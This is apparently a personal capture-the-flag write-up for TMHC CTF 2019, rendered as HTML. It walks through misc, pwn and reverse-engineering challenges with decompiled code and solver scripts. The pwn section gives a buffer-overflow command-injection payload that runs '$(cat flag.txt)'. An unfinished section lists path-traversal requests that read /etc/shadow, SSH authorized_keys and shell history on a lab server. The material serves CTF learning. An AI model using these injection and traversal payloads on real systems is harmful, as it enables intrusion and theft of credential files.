@@ -1,0 +1,440 @@
+<!DOCTYPE html><html style=""><head>
+        <base href="file://D:/CTFS/TMHCCTF/">
+        <link rel="preload" href="file://C:/Users/bread/AppData/Roaming/Brackets/extensions/user/brackets-markdown-preview/themes/dark.css" as="style">
+        <link rel="preload" href="file://C:/Users/bread/AppData/Roaming/Brackets/extensions/user/brackets-markdown-preview/styles/preview.css" as="style">
+        <link rel="preload" href="file://C:/Users/bread/AppData/Roaming/Brackets/extensions/user/brackets-markdown-preview/lib/highlight.js/styles/darkula.css" as="style">
+        <link rel="stylesheet" href="file://C:/Users/bread/AppData/Roaming/Brackets/extensions/user/brackets-markdown-preview/themes/dark.css">
+        <link rel="stylesheet" href="file://C:/Users/bread/AppData/Roaming/Brackets/extensions/user/brackets-markdown-preview/styles/preview.css">
+        <link rel="stylesheet" href="file://C:/Users/bread/AppData/Roaming/Brackets/extensions/user/brackets-markdown-preview/lib/highlight.js/styles/darkula.css">
+        <meta name="generator" content="brackets-markdown-preview">
+        <meta name="origin" content="bread.md">
+        <meta name="description" content="Preview of the Markdown document 'bread.md'">
+        <meta charset="utf-8">
+        <title>bread.md</title>
+    </head>
+    <body class="markdown-body adaptive" style="">
+        <h1 id="tmhc-ctf-2019">TMHC CTF 2019</h1>
+<blockquote>
+<p>By Bread (@nonsxd) </p>
+</blockquote>
+<h2 id="c4n_i_h4z_c0d3_n_crypt0-category-misc">C4n_I_h4z_c0d3_n_crypt0 - Category: Misc</h2>
+<p>This was a web/programming based challenge where you where given some maths and you needed to return the answer.</p>
+<p>taking a gamble that the creaters werent going to mess with me i decided to take the simplest path. <code>eval()</code>
+and well that worked.
+i couldnt be bothered dealing with the <code>base64</code> inline so i did it manually and ran my soultion again with the fix.</p>
+<blockquote>
+<p>note: dont forget requests.Session()</p>
+</blockquote>
+<pre><code class="lang-python hljs"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">'http://docker.hackthebox.eu:30307/flag'</span>
+g = requests.Session()
+x = g.post(url).text.split(<span class="hljs-string">"&lt;br&gt;"</span>)
+
+problem=format(eval(x[<span class="hljs-number">2</span>]),<span class="hljs-string">'.2f'</span>)
+
+<span class="hljs-keyword">while</span> <span class="hljs-string">u'Problem:'</span> <span class="hljs-keyword">in</span> x[<span class="hljs-number">1</span>]:
+    data = {<span class="hljs-string">'answer'</span>: problem}
+    x = g.post(url, data=data).text.split(<span class="hljs-string">"&lt;br&gt;"</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">u'Problem:'</span> <span class="hljs-keyword">in</span> x[<span class="hljs-number">1</span>]:
+        problem = format(eval(x[<span class="hljs-number">1</span>][<span class="hljs-number">8</span>:]),<span class="hljs-string">'.2f'</span>)
+    <span class="hljs-keyword">else</span>:
+        data = {<span class="hljs-string">'answer'</span>: <span class="hljs-string">'YES_I_CAN!'</span>}
+        flag = g.post(url, data=data).text
+        <span class="hljs-keyword">print</span> (flag)
+</code></pre>
+<pre><code class="lang-bash hljs">bread@sticks:~<span class="hljs-comment">#python3 solve.py</span>
+TMHC{}
+</code></pre>
+<p>and we have the flag:</p>
+<pre><code class="hljs css">`<span class="hljs-selector-tag">TMHC</span>{}`   
+</code></pre><h2 id="desk-category-misc">DESk - Category: Misc</h2>
+<ul>
+<li>Looked at the image noticed it was a chess move.</li>
+<li>Recently i knew of a weird chess/linux related thing where ken thompsons password was cracked</li>
+<li>Googled for that, found his password <code>p/q2-q4!</code></li>
+<li>Looked at the supplied image to see that the pawn in front of the king is moving from 2-4 </li>
+<li>Extraperlating that to mean this password is <code>p/k2-k4!</code></li>
+<li>Unzip using the password and get the flag</li>
+</ul>
+<pre><code class="hljs markdown"><span class="hljs-code">`TMHC{1_kn0w_d35cr1pt1v3_n0t4t10n}`</span>
+</code></pre><h2 id="beeeep_beeeep-category-misc">Beeeep_Beeeep - Category: Misc</h2>
+<ul>
+<li>Listened to the audio and recognised it as a video from SmarterEveryDay</li>
+<li>Found the specific video <a href="https://www.youtube.com/watch?v=4gibcRfp4zA" title="https://www.youtube.com/watch?v=4gibcRfp4zA">Oscilloscope Music - (Drawing with Sound) - Smarter Every Day 224</a></li>
+<li>Looked for an Oscilloscope tool and found <a href="http://asdfg.me/osci/" title="http://asdfg.me/osci/">asdfg.me/osci/</a></li>
+<li>Opened the file and we have the flag being played in pieces</li>
+</ul>
+<pre><code class="hljs markdown"><span class="hljs-code">`TMHC{0f5ee61ef3fbb4bb066df8c286ec84b07a7a5d95}`</span>
+</code></pre><h2 id="overdosed-category-pwn">overdosed - Category: PWN</h2>
+<p>opened in ghidra, looked at <code>main()</code></p>
+<pre><code class="lang-c hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(undefined4 param_1,undefined8 param_2)</span></span>{
+  undefined *__command;
+  <span class="hljs-keyword">size_t</span> sVar1;
+  ulong uVar2;
+  undefined8 auStack176 [<span class="hljs-number">2</span>];
+  undefined4 local_9c;
+  <span class="hljs-keyword">char</span> local_98 [<span class="hljs-number">72</span>];
+  undefined *local_50;
+  <span class="hljs-keyword">long</span> local_48;
+  <span class="hljs-keyword">int</span> local_3c;
+
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1013bf</span>;
+  auStack176[<span class="hljs-number">1</span>] = param_2;
+  local_9c = param_1;
+  first_chall();
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1013cb</span>;
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Hey, I am from TMHC. Could you tell me your name?"</span>);
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1013dc</span>;
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name: "</span>);
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1013eb</span>;
+  fflush(<span class="hljs-built_in">stdout</span>);
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x101409</span>;
+  read(<span class="hljs-number">1</span>,local_98,<span class="hljs-number">0x40</span>);
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x101418</span>;
+  sVar1 = <span class="hljs-built_in">strlen</span>(local_98);
+  local_3c = (<span class="hljs-keyword">int</span>)sVar1;
+  auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x101434</span>;
+  uVar2 = name_check((<span class="hljs-keyword">long</span>)local_98,local_3c,<span class="hljs-number">0</span>);
+  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int</span>)uVar2 == <span class="hljs-number">0</span>) {
+    local_48 = (<span class="hljs-keyword">long</span>)(local_3c + <span class="hljs-number">0x12</span>) + <span class="hljs-number">-1</span>;
+    uVar2 = ((<span class="hljs-keyword">long</span>)(local_3c + <span class="hljs-number">0x12</span>) + <span class="hljs-number">0xf</span>U) / <span class="hljs-number">0x10</span>;
+    local_50 = (undefined *)(auStack176[<span class="hljs-number">1</span>] + uVar2 * <span class="hljs-number">0x1ffffffffffffffe</span>);
+    auStack176[uVar2 * <span class="hljs-number">0x1ffffffffffffffe</span>] = <span class="hljs-number">0x1014be</span>;
+    <span class="hljs-built_in">sprintf</span>((<span class="hljs-keyword">char</span> *)(auStack176[<span class="hljs-number">1</span>] + uVar2 * <span class="hljs-number">0x1ffffffffffffffe</span>),<span class="hljs-string">"/bin/echo Hello \"%s\""</span>,local_98,
+            local_98);
+    __command = local_50;
+    auStack176[uVar2 * <span class="hljs-number">0x1ffffffffffffffe</span>] = <span class="hljs-number">0x1014ca</span>;
+    system(__command,*(undefined *)(auStack176 + uVar2 * <span class="hljs-number">0x1ffffffffffffffe</span>));
+  }
+  <span class="hljs-keyword">else</span> {
+    auStack176[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1014db</span>;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal name!"</span>);
+  }
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>From here we can see a couple of things:</p>
+<ul>
+<li><code>first_chall()</code></li>
+<li><code>local_98</code> is the name variable, <code>local_3c</code> is length and they are used in the <code>name_check</code> function.</li>
+<li>if that function returns a <code>0</code>, then our name vairable is used in the string <code>"/bin/echo Hello \"%s\""</code> which is an arguement to <code>system()</code>.</li>
+</ul>
+<p>this means we can probably command inject, but first we need to see what <code>first_chall</code> and <code>name_check</code> do.</p>
+<pre><code class="lang-c hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">first_chall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>{
+  <span class="hljs-keyword">size_t</span> sVar1;
+  ulong uVar2;
+  <span class="hljs-keyword">char</span> local_a8 [<span class="hljs-number">32</span>];
+  <span class="hljs-keyword">char</span> local_88 [<span class="hljs-number">32</span>];
+  <span class="hljs-keyword">char</span> local_68 [<span class="hljs-number">64</span>];
+  undefined8 local_28;
+  undefined8 local_20;
+  undefined4 local_18;
+  FILE *local_10;
+
+  local_28 = <span class="hljs-number">0x7869704851</span>;
+  local_20 = <span class="hljs-number">0</span>;
+  local_18 = <span class="hljs-number">0</span>;
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Could you tell me about yourself?"</span>);
+  fflush(<span class="hljs-built_in">stdout</span>);
+  gets(local_68);
+  sVar1 = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">char</span> *)&amp;local_28);
+  uVar2 = name_check((<span class="hljs-keyword">long</span>)&amp;local_28,(<span class="hljs-keyword">int</span>)sVar1,<span class="hljs-number">1</span>);
+  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int</span>)uVar2 == <span class="hljs-number">0</span>) {
+    <span class="hljs-built_in">sprintf</span>(local_a8,<span class="hljs-string">"/bin/echo \"%s\""</span>,&amp;local_28);
+    local_10 = popen(local_a8,<span class="hljs-string">"r"</span>);
+    fgets(local_88,<span class="hljs-number">0x1e</span>,local_10);
+    setenv(<span class="hljs-string">"name"</span>,local_88,<span class="hljs-number">1</span>);
+  }
+  <span class="hljs-keyword">else</span> {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Too bad!!"</span>);
+  }
+  <span class="hljs-keyword">return</span>;
+}
+</code></pre>
+<p>ok lets read the code:</p>
+<ul>
+<li>we can see that an environment variable (<code>name</code>) is set to the value found in <code>local_88</code> <ul>
+<li>which can only be <code>30</code> char long.</li>
+<li>which is the output of <code>popen()</code></li>
+</ul>
+</li>
+<li><code>popen()</code> is constructed with <code>"/bin/echo \"%s\""</code> and <code>local_28</code><ul>
+<li><code>local_28 == 0x7869704851</code> or <code>QHpix</code></li>
+</ul>
+</li>
+<li>for no apperent reason a <code>gets(local_68)</code> call exists<ul>
+<li><code>local_68</code> is not used after this point.</li>
+<li><code>local_68 [64]</code>, length is 64.</li>
+<li><code>gets()</code> is a known vulnerable function, used in BOF attacks</li>
+</ul>
+</li>
+</ul>
+<p>This means we have a BOF, and with it (depending on the stack layout) we can control the environment variable (<code>name</code>).</p>
+<p>lets take a look at <code>name_check</code> now because both the CI and BOF rely on it returning <code>0</code>:</p>
+<pre><code class="lang-c hljs cpp"><span class="hljs-function">ulong <span class="hljs-title">name_check</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1,<span class="hljs-keyword">int</span> param_2,<span class="hljs-keyword">int</span> param_3)</span></span>{
+  <span class="hljs-keyword">char</span> cVar1;
+  uint local_10;
+  <span class="hljs-keyword">int</span> local_c;
+
+  local_10 = <span class="hljs-number">0</span>;
+  local_c = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">while</span> (local_c &lt; param_2) {
+    cVar1 = *(<span class="hljs-keyword">char</span> *)(param_1 + local_c);
+    <span class="hljs-keyword">if</span> (cVar1 == <span class="hljs-string">'/'</span>) {
+      <span class="hljs-keyword">if</span> (param_3 == <span class="hljs-number">0</span>) {
+        local_10 = <span class="hljs-number">0xffffffff</span>;
+      }
+    }
+    <span class="hljs-keyword">else</span> {
+      <span class="hljs-keyword">if</span> (cVar1 &lt; <span class="hljs-string">'0'</span>) {
+        <span class="hljs-keyword">if</span> (cVar1 == <span class="hljs-string">'&amp;'</span>) {
+          local_10 = <span class="hljs-number">0xffffffff</span>;
+        }
+        <span class="hljs-keyword">else</span> {
+          <span class="hljs-keyword">if</span> (cVar1 == <span class="hljs-string">'('</span>) {
+            <span class="hljs-keyword">if</span> (param_3 == <span class="hljs-number">0</span>) {
+              local_10 = <span class="hljs-number">0xffffffff</span>;
+            }
+          }
+          <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">if</span> ((cVar1 == <span class="hljs-string">'\"'</span>) &amp;&amp; (param_3 == <span class="hljs-number">0</span>)) {
+              local_10 = <span class="hljs-number">0xffffffff</span>;
+            }
+          }
+        }
+      }
+      <span class="hljs-keyword">else</span> {
+        <span class="hljs-keyword">if</span> (cVar1 == <span class="hljs-string">'`'</span>) {
+          local_10 = <span class="hljs-number">0xffffffff</span>;
+        }
+        <span class="hljs-keyword">else</span> {
+          <span class="hljs-keyword">if</span> (cVar1 == <span class="hljs-string">'|'</span>) {
+            local_10 = <span class="hljs-number">0xffffffff</span>;
+          }
+          <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">if</span> ((cVar1 == <span class="hljs-string">';'</span>) &amp;&amp; (param_3 == <span class="hljs-number">0</span>)) {
+              local_10 = <span class="hljs-number">0xffffffff</span>;
+            }
+          }
+        }
+      }
+    }
+    local_c += <span class="hljs-number">1</span>;
+  }
+  <span class="hljs-keyword">return</span> (ulong)local_10;
+}
+</code></pre>
+<p>This is simple enough its a blacklist function, that triggers on any occerances of these characters <code>['/', '&amp;', '(', '\"', '`', '|', ';']</code>.</p>
+<p>a couple of intersting things to note:</p>
+<ul>
+<li>there is no <code>$</code> blacklisting.</li>
+<li>there is a bypass flag <code>param_3</code>.<ul>
+<li>the call from <code>first_chall</code> is set to <code>1</code> allowing a bypass.</li>
+<li>the call from <code>main</code> is set to <code>0</code>, so we have a restricted CI there.</li>
+</ul>
+</li>
+</ul>
+<h3 id="lets-put-this-all-together-then">lets put this all together then</h3>
+<ul>
+<li>we use the BOF to set <code>name</code> env to a command of our choice.<ul>
+<li><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")</code></li>
+</ul>
+</li>
+<li>we then call <code>name</code> using <code>$name</code></li>
+</ul>
+<pre><code class="lang-bash hljs">bread@sticks:~<span class="hljs-comment"># ./overdosed </span>
+Could you tell me about yourself?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"bread"</span>)
+Hey, I am from TMHC. Could you tell me your name?
+Name: <span class="hljs-variable">$name</span>
+Hello bread
+</code></pre>
+<p>yep that works, guess the stack is set up how i expected. lets try it on the server.</p>
+<pre><code class="lang-bash hljs">bread@sticks:~<span class="hljs-comment"># nc docker.hackthebox.eu 1337</span>
+Could you tell me about yourself?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(cat flag.txt)
+Hey, I am from TMHC. Could you tell me your name?
+Name: <span class="hljs-variable">$name</span>
+Hello TMHC{}
+</code></pre>
+<p>got the flag</p>
+<pre><code class="hljs css">`<span class="hljs-selector-tag">TMHC</span>{}`
+</code></pre><h2 id="operation-category-re">Operation - Category: RE</h2>
+<p>Opened in ghidra read <code>main()</code></p>
+<pre><code class="lang-c hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,undefined8 *argv)</span></span>{
+  <span class="hljs-keyword">int</span> iVar1;
+  <span class="hljs-keyword">char</span> local_28 [<span class="hljs-number">32</span>];
+
+  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage: %s &lt;file&gt;\n"</span>,*argv);
+                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+  }
+  <span class="hljs-keyword">if</span> (<span class="hljs-number">2</span> &lt; argc) {
+    iVar1 = <span class="hljs-built_in">strncmp</span>(<span class="hljs-string">"--debug"</span>,(<span class="hljs-keyword">char</span> *)argv[<span class="hljs-number">2</span>],<span class="hljs-number">7</span>);
+    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {
+      isDebug = <span class="hljs-number">1</span>;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"operations is at: %p\n"</span>,operations);
+    }
+  }
+  readFlag(local_28,(<span class="hljs-keyword">char</span> *)argv[<span class="hljs-number">1</span>]);
+  operations((<span class="hljs-keyword">long</span>)local_28,<span class="hljs-number">0</span>);
+  <span class="hljs-built_in">puts</span>(local_28);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>which as you can see at the bottom 2 functions are called firstly <code>readFlag()</code> then <code>operations()</code>
+if we quickly look at <code>operations()</code> if param_2 does not equal <code>0</code> then the operations are not applied.</p>
+<pre><code class="lang-c hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operations</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1,<span class="hljs-keyword">int</span> param_2)</span></span>{
+  <span class="hljs-keyword">int</span> local_c;
+
+  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) {
+    local_c = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">while</span> (local_c &lt; <span class="hljs-number">5</span>) {
+      *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ <span class="hljs-number">0x23</span>;
+      local_c += <span class="hljs-number">1</span>;
+    }
+    local_c = <span class="hljs-number">5</span>;
+    <span class="hljs-keyword">while</span> (local_c &lt; <span class="hljs-number">0xf</span>) {
+      *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ <span class="hljs-number">0x19</span>;
+      local_c += <span class="hljs-number">1</span>;
+    }
+    local_c = <span class="hljs-number">0xf</span>;
+    <span class="hljs-keyword">while</span> (local_c &lt; <span class="hljs-number">0x19</span>) {
+      *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ <span class="hljs-number">1</span>;
+      local_c += <span class="hljs-number">1</span>;
+    }
+  }
+  <span class="hljs-keyword">return</span>;
+}
+</code></pre>
+<p>At this point you can patch the call to <code>operations()</code>, setting <code>param_2</code> to any int other than <code>0</code> and it will do the operations for you.
+however a quick read of the code and we can see its just some <code>XOR</code> operations.</p>
+<p>Easy enough to do ourselves, copy the content from <code>flag.txt</code>, put in <code>cyberchef</code> and use the <code>xor</code> function.
+set the first <code>5 chars</code> of the key to <code>0x23</code>, next 5 <code>0x19</code>,and then the remaining to <code>0x01</code></p>
+<pre><code class="hljs vbnet"><span class="hljs-keyword">XOR</span> <span class="hljs-keyword">KEY</span>
+<span class="hljs-number">23232323231919191919191919191901010101010101010101</span>
+</code></pre><p><a href="https://gchq.github.io/CyberChef/#recipe=XOR%28%7B%27option%27:%27Hex%27,%27string%27:%2723232323231919191919191919191901010101010101010101%27%7D,%27Standard%27,false%29&amp;input=d25rYFh7KG1OcCx8RilpRHM1dWhOb3J8Cw" title="https://gchq.github.io/CyberChef/#recipe=XOR%28%7B%27option%27:%27Hex%27,%27string%27:%2723232323231919191919191919191901010101010101010101%27%7D,%27Standard%27,false%29&amp;input=d25rYFh7KG1OcCx8RilpRHM1dWhOb3J8Cw">Recipe</a></p>
+<p>got the flag:</p>
+<pre><code class="hljs markdown"><span class="hljs-code">`TMHC{b1tWi5e_0pEr4tiOns}`</span>
+</code></pre><h2 id="denuevo-category-re">DeNuevo - Category: RE</h2>
+<p>Opened in ghidra read <code>entry()</code> which calls <code>FUN_00401073(1)</code>
+if we have a look at that code, we see a loop using an <code>XOR</code> operation,  on the <code>local_res0</code> variable.</p>
+<pre><code class="lang-c hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00401073</span><span class="hljs-params">(UINT param_1)</span>
+
+</span>{
+  code *pcVar1;
+  <span class="hljs-keyword">int</span> iVar2;
+  byte *pbVar3;
+  byte *local_res0;
+
+  iVar2 = <span class="hljs-number">0x69</span>;
+  pbVar3 = local_res0;
+  <span class="hljs-keyword">do</span> {
+    *pbVar3 = *pbVar3 ^ <span class="hljs-number">0xab</span>;
+    pbVar3 = pbVar3 + <span class="hljs-number">1</span>;
+    iVar2 += <span class="hljs-number">-1</span>;
+  } <span class="hljs-keyword">while</span> (iVar2 != <span class="hljs-number">0</span>);
+  WinExec((LPCSTR)local_res0,param_1);
+  ExitProcess(<span class="hljs-number">0</span>);
+  pcVar1 = (code *)swi(<span class="hljs-number">3</span>);
+  (*pcVar1)();
+  <span class="hljs-keyword">return</span>;
+}
+</code></pre>
+<p>We dont currently know what <code>local_res0</code> is but we do know what onces the <code>XOR</code> loop is completed its used by <code>WinExec()</code>. </p>
+<blockquote>
+<p>Runs the specified application.</p>
+<pre><code class="hljs objectivec"><span class="hljs-built_in">UINT</span> WinExec(
+  LPCSTR lpCmdLine,
+  <span class="hljs-built_in">UINT</span>   uCmdShow
+);
+</code></pre><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec" title="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec function</a></p>
+</blockquote>
+<p>OK lets open it now with <code>x32dbg</code> and set a breakpoint at the called to <code>WinExec()</code> (<code>003B1081</code>), and run.
+looks like the arguements to <code>WinExec()</code> are:</p>
+<pre><code class="hljs xquery"><span class="hljs-number">1</span>: [esp] <span class="hljs-number">003</span>B100B <span class="hljs-string">"C:\\Python27\\python.exe -c \"</span><span class="hljs-keyword">import</span> zlib;exec(zlib.decompress(open(<span class="hljs-string">'.\\denuevo.exe'</span>,<span class="hljs-string">'rb'</span>).read()[<span class="hljs-number">9216</span>:]))\<span class="hljs-string">""</span>
+<span class="hljs-number">2</span>: [esp+<span class="hljs-number">4</span>] <span class="hljs-number">00000001</span>
+</code></pre><p>change that up a little so its written to a file rather than <code>exec</code>.</p>
+<pre><code class="lang-python hljs"><span class="hljs-keyword">import</span> zlib
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'extracted_file.py'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
+    f.write(zlib.decompress(open(<span class="hljs-string">'denuevo.exe'</span>,<span class="hljs-string">'rb'</span>).read()[<span class="hljs-number">9216</span>:]))
+</code></pre>
+<p>and we have (minus the snake game):</p>
+<pre><code class="lang-python hljs">x = list(raw_input(<span class="hljs-string">"Enter your serial key: "</span>))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">'j'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'g'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'2'</span>]:
+    <span class="hljs-keyword">if</span> x.pop() != i: exit()
+i = int(i)
+<span class="hljs-keyword">while</span> i != <span class="hljs-number">9</span>:
+    <span class="hljs-keyword">if</span> x.pop() != [<span class="hljs-string">'j'</span>,<span class="hljs-string">'x'</span>,<span class="hljs-string">'d'</span>,<span class="hljs-string">'y'</span>,<span class="hljs-string">'z'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'5'</span>][i]: exit()
+    i += <span class="hljs-number">-4</span> <span class="hljs-keyword">if</span> i + <span class="hljs-number">3</span> &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i != <span class="hljs-number">6</span> <span class="hljs-keyword">else</span> <span class="hljs-number">3</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">"Your serial key has activated the videogame! Submit the challenge with TMHC{serial}"</span>
+...
+</code></pre>
+<p>finaly part is to use the loops to undo themselves.</p>
+<pre><code class="lang-python hljs"><span class="hljs-comment"># reverse the array</span>
+serial = [<span class="hljs-string">'j'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'g'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'2'</span>][::<span class="hljs-number">-1</span>]
+x = serial.copy()
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">'j'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'g'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'2'</span>]:
+    <span class="hljs-keyword">if</span> x.pop() != i: exit()
+i = int(i)
+<span class="hljs-keyword">while</span> i != <span class="hljs-number">9</span>:
+    <span class="hljs-comment"># insert at the start</span>
+    serial.insert(<span class="hljs-number">0</span>,[<span class="hljs-string">'j'</span>,<span class="hljs-string">'x'</span>,<span class="hljs-string">'d'</span>,<span class="hljs-string">'y'</span>,<span class="hljs-string">'z'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'5'</span>][i])
+    i += <span class="hljs-number">-4</span> <span class="hljs-keyword">if</span> i + <span class="hljs-number">3</span> &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i != <span class="hljs-number">6</span> <span class="hljs-keyword">else</span> <span class="hljs-number">3</span>
+<span class="hljs-keyword">print</span> (<span class="hljs-string">f"TMHC<span class="hljs-subst">{<span class="hljs-string">'{'</span>+<span class="hljs-string">''</span>.join(serial)+<span class="hljs-string">'}'</span>}</span>"</span>)
+</code></pre>
+<p>and we get the flag:</p>
+<pre><code class="lang-bash hljs">bread@sticks:~<span class="hljs-comment"># python solve.py</span>
+TMHC{5yjzx3d265gb7j}
+</code></pre>
+<pre><code class="hljs markdown"><span class="hljs-code">`TMHC{5yjzx3d265gb7j}`</span>
+</code></pre><h2 id="other-category-incomplete">Other - Category: incomplete</h2>
+<pre><code class="hljs makefile"><span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../home/web/.bash_history</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../home/web/.histdb/zsh-history.db</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../home/web/whatcanisudo</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../opt/checkflag9of10.exe</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../home/web/.zsh_history</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../etc/ssh/sshd_config</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../../home/web/.ssh/authorized_keys</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../../etc/shadow</span>
+<span class="hljs-section">view-source:http://docker.hackthebox.eu:30361/?page=../../../../../home/flag3of10/.ssh/authorized_keys</span>
+
+
+<span class="hljs-section">flag(1/10):TMHC{y0u_</span>
+<span class="hljs-section">flag(2/10):0nly_g3t</span>
+<span class="hljs-section">flag(3/10):#1flag</span>
+<span class="hljs-section">flag(4/10):</span>
+<span class="hljs-section">flag(5/10):7iME_:(_</span>
+<span class="hljs-section">flag(6/10):Bu7_Th3r3_</span>
+<span class="hljs-section">flag(7/10):</span>
+<span class="hljs-section">flag(8/10):_A_l0t_</span>
+<span class="hljs-section">flag(9/10): &lt;? errrrh re&gt;</span>
+<span class="hljs-section">flag(10/10):</span>
+</code></pre>
+        <script>
+            // Fix the broken internal anchor links (HTML Bookmarks) issue when a BASE element with a HREF attribute is specified
+            // => Adds an event listener for click events if the BASE element is found and if it have a HREF.
+            // => The function will only adapt the behavior for in-page anchors (e.g. <a href="#bookmark">jump to bookmark</a>)
+            // => This solution is using a listener for ALL clicks instead of one for the bookmark anchor elements only.
+            //    Hence, the solution deals properly with dynamically "generated" (e.g. per script) bookmarks!
+            var base = document.getElementsByTagName("base")[0];
+            if (base && base.getAttribute("href")) {
+                document.addEventListener("click", function(event) {
+                    var element = event.target;
+                    var href = element.getAttribute("href");
+                    if (element.tagName.toLowerCase() == "a" && href.indexOf("#") === 0) {
+                        // Always reset the location hash first.
+                        // In oder case, repeating a click on the same link will be ignored.
+                        document.location.hash = "";
+                        document.location.hash = href; 
+                        //window.console.log("Anchor link: " + href);
+                        // when setting the hash value manually, we must prevent the default behavior of the click event
+                        event.preventDefault();
+                    }
+                });   
+            } 
+        </script>
+    
+</body></html>
